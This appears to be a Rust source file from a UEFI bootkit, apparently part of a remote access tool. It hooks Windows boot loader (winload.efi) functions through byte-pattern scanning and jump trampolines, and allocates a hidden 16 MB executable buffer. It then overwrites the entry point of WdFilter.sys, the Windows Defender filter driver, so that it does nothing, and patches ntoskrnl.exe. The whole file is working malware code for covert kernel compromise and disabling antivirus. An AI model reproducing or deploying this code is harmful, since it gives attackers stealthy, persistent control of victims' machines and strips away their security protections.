// Note that winload.efi operates in 2 contexts: firmware and kernel. In firmware context, physical addresses are used.
// In kernel context, virtual addresses are used. After transitioning to ntoskrnl.exe, physical addresses are no longer
// valid.

use alloc::boxed::Box;
use alloc::vec::Vec;
use core::sync::atomic::{AtomicI64, AtomicPtr, Ordering};
use core::{mem, ptr, slice};

use log::{debug, error, info, warn};
use rat_common::windows::utils::{insert_jmp_trampoline, return_zero_patch};
use uefi::Status;
use windows_sys::w;

use crate::hooks::ntoskrnl::patch_ntoskrnl;
use crate::patcher::VariablePatternFinder;
use crate::utils;
use crate::utils::types::_LOADER_PARAMETER_BLOCK;

type _BlImgAllocateImageBufferFn = unsafe extern "efiapi" fn(
    image_buffer: *mut *mut u8,
    image_size: u64,
    memory_type: u32,
    preferred_attributes: u32,
    preferred_alignment: u32,
    flags: u32,
) -> Status;

type _OslFwpKernelSetupPhase1Fn =
    unsafe extern "efiapi" fn(loader_block: *mut _LOADER_PARAMETER_BLOCK) -> Status;

static _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER: AtomicI64 = AtomicI64::new(0);
static _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1: AtomicI64 = AtomicI64::new(0);

static _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES: AtomicPtr<Vec<u8>> =
    AtomicPtr::new(ptr::null_mut());
static _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1_BYTES: AtomicPtr<Vec<u8>> =
    AtomicPtr::new(ptr::null_mut());

static ALLOCATED_IMAGE_BUFFER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

const _ALLOCATED_IMAGE_BUFFER_SIZE: u64 = 0x1000000; // 16 MB
const _BL_MEMORY_TYPE_APPLICATION: u32 = 0xE0000012;
const _BL_MEMORY_ATTRIBUTE_RWX: u32 = 0x424000;

const _BL_IMG_ALLOCATE_IMAGE_BUFFER: &[[u8; 49]] = &[[
    0xCC, // 1 byte before (int)
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, // 8 bytes
    0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x55, // 8 bytes
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // 8 bytes
    0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x40, 0x48, // 8 bytes
    0x8B, 0x31, 0x4C, 0x8D, 0x7A, 0xFF, 0x45, 0x33, // 8 bytes
    0xED, 0x48, 0x89, 0x75, 0x30, 0x4C, 0x89, 0x29, // 8 bytes
]];

const _OSL_FWP_KERNEL_SETUP_PHASE1: &[[u8; 25]] = &[[
    0xCC, // 1 byte before (int)
    0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x53, 0x56, // 8 bytes
    0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, // 8 bytes
    0x57, 0x48, 0x8D, 0x6C, 0x24, 0xE1, 0x48, 0x81, // 8 bytes
]];

unsafe extern "efiapi" fn _bl_img_allocate_image_buffer_hooked(
    image_buffer: *mut *mut u8,
    image_size: u64,
    memory_type: u32,
    preferred_attributes: u32,
    preferred_alignment: u32,
    flags: u32,
) -> Status {
    debug!("_bl_img_allocate_image_buffer_hooked called!");

    let cr0 = utils::DisableWriteProtection::new();
    let original = _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER.load(Ordering::Acquire) as *mut u8;
    unsafe {
        let mut bytes = Box::from_raw(
            _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES.swap(ptr::null_mut(), Ordering::AcqRel),
        );
        let size = bytes.len();
        bytes.swap_with_slice(slice::from_raw_parts_mut(original, size));

        _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES.store(Box::into_raw(bytes), Ordering::Release);
    }
    drop(cr0);

    let original_fn = unsafe { mem::transmute::<*const u8, _BlImgAllocateImageBufferFn>(original) };
    let status = unsafe {
        original_fn(
            image_buffer,
            image_size,
            memory_type,
            preferred_attributes,
            preferred_alignment,
            flags,
        )
    };

    let mut restore_hook = true;
    if status == Status::SUCCESS
        && memory_type == _BL_MEMORY_TYPE_APPLICATION
        && preferred_attributes == _BL_MEMORY_ATTRIBUTE_RWX
    {
        let mut buffer = ptr::null_mut();
        let status = unsafe {
            original_fn(
                &mut buffer,
                _ALLOCATED_IMAGE_BUFFER_SIZE,
                _BL_MEMORY_TYPE_APPLICATION,
                _BL_MEMORY_ATTRIBUTE_RWX,
                preferred_alignment,
                flags,
            )
        };

        if status == Status::SUCCESS && !buffer.is_null() {
            // Success, we do not hook the function anymore
            ALLOCATED_IMAGE_BUFFER.store(buffer, Ordering::Release);

            restore_hook = false;
            info!(
                "Allocated our image buffer at {buffer:p}, size {_ALLOCATED_IMAGE_BUFFER_SIZE}. BlImgAllocateImageBuffer hook will be removed."
            );
        } else {
            warn!(
                "Failed to allocate our image buffer ({status:X?}, buffer={buffer:p}), will try again on the next call"
            );
        }
    }

    if restore_hook {
        let cr0 = utils::DisableWriteProtection::new();
        unsafe {
            let mut bytes = Box::from_raw(
                _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES
                    .swap(ptr::null_mut(), Ordering::AcqRel),
            );
            let size = bytes.len();
            bytes.swap_with_slice(slice::from_raw_parts_mut(original, size));

            _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES
                .store(Box::into_raw(bytes), Ordering::Release);
        }
        drop(cr0);
    }

    status
}

unsafe extern "efiapi" fn _osl_fwp_kernel_setup_phase1_hooked(
    loader_block: *mut _LOADER_PARAMETER_BLOCK,
) -> Status {
    debug!("_osl_fwp_kernel_setup_phase1_hooked called!");

    let cr0 = utils::DisableWriteProtection::new();
    let original = _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1.load(Ordering::Acquire) as *mut u8;
    unsafe {
        let bytes = Box::from_raw(
            _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1_BYTES.swap(ptr::null_mut(), Ordering::AcqRel),
        );
        original.copy_from_nonoverlapping(bytes.as_ptr(), bytes.len());

        // Avoid releasing memory by dropping the `Box` here. `ExitBootServices()` may have been called by winload at this point,
        // which means that memory deallocation service is no longer available.
        Box::leak(bytes);
    }

    let load_order_list_head = unsafe { &(*loader_block).LoadOrderListHead };

    if let Some(wdfilter_entry) =
        unsafe { utils::get_boot_loaded_module(load_order_list_head, w!("WdFilter.sys")) }
    {
        let patched = return_zero_patch();
        unsafe {
            ptr::copy_nonoverlapping(
                patched.as_ptr(),
                wdfilter_entry.kldr_entry.EntryPoint as *mut u8,
                patched.len(),
            );
        }

        info!(
            "Patched WdFilter.sys entrypoint at {:p}",
            wdfilter_entry.kldr_entry.EntryPoint,
        );
    } else {
        warn!("Cannot find base address of WdFilter.sys");
    }

    if let Some(ntoskrnl_entry) =
        unsafe { utils::get_boot_loaded_module(load_order_list_head, w!("ntoskrnl.exe")) }
    {
        let ntoskrnl = unsafe {
            slice::from_raw_parts_mut(
                ntoskrnl_entry.kldr_entry.DllBase as *mut u8,
                ntoskrnl_entry.kldr_entry.SizeOfImage as usize,
            )
        };

        let mut empty = [];
        let buffer = ALLOCATED_IMAGE_BUFFER.swap(ptr::null_mut(), Ordering::AcqRel);
        let buffer = if buffer.is_null() {
            &mut empty
        } else {
            unsafe { slice::from_raw_parts_mut(buffer, _ALLOCATED_IMAGE_BUFFER_SIZE as usize) }
        };

        patch_ntoskrnl(ntoskrnl, buffer, load_order_list_head);
    } else {
        warn!("Cannot find base address of ntoskrnl.exe");
    }

    drop(cr0);

    unsafe {
        let original_fn = mem::transmute::<*mut u8, _OslFwpKernelSetupPhase1Fn>(original);
        original_fn(loader_block)
    }
}

fn _patch_bl_img_allocate_image_buffer(winload: &mut [u8]) -> bool {
    if let Some(original) =
        VariablePatternFinder::new(_BL_IMG_ALLOCATE_IMAGE_BUFFER).find_mut(winload)
    {
        let original = &mut original[1..];
        _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER.store(original.as_ptr() as i64, Ordering::Release);

        let mut saved = [0; 512];
        let mut size = 0;
        if insert_jmp_trampoline(
            original,
            _bl_img_allocate_image_buffer_hooked as *const u8 as u64,
            Some(&mut saved),
            Some(&mut size),
        ) {
            _ORIGINAL_BL_IMG_ALLOCATE_IMAGE_BUFFER_BYTES.store(
                Box::into_raw(Box::new(saved[..size].to_vec())),
                Ordering::Release,
            );

            info!("Patched BlImgAllocateImageBuffer");
            return true;
        }
    }

    error!("Cannot find BlImgAllocateImageBuffer");
    false
}

fn _patch_osl_fwp_kernel_setup_phase1(winload: &mut [u8]) -> bool {
    if let Some(original) =
        VariablePatternFinder::new(_OSL_FWP_KERNEL_SETUP_PHASE1).find_mut(winload)
    {
        let original = &mut original[1..];
        _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1.store(original.as_ptr() as i64, Ordering::Release);

        let mut saved = [0; 512];
        let mut size = 0;
        if insert_jmp_trampoline(
            original,
            _osl_fwp_kernel_setup_phase1_hooked as *const u8 as u64,
            Some(&mut saved),
            Some(&mut size),
        ) {
            _ORIGINAL_OSL_FWP_KERNEL_SETUP_PHASE1_BYTES.store(
                Box::into_raw(Box::new(saved[..size].to_vec())),
                Ordering::Release,
            );

            info!("Patched OslFwpKernelSetupPhase1");
            return true;
        }
    }

    error!("Cannot find OslFwpKernelSetupPhase1");
    false
}

pub fn patch_winload(winload: &mut [u8]) {
    info!("Patching winload.efi...");

    if !_patch_bl_img_allocate_image_buffer(winload) {
        return;
    }

    _patch_osl_fwp_kernel_setup_phase1(winload);
}
